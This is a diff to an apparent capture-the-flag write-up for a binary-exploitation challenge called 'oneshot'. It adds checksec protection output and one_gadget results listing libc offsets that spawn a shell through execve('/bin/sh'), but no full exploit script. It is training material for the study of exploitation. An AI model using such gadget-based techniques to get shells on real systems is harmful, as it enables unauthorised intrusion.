@@ -47,5 +47,37 @@ int main(int argc, char *argv[]) {
 ## Solution
 ---
 
+```
+Ubuntu 16.04
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      PIE enabled
+```
+
+<br>
+
+```shell
+index@KJS:~/oneshot$ one_gadget ./libc.so.6
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+<br>
+
 
 
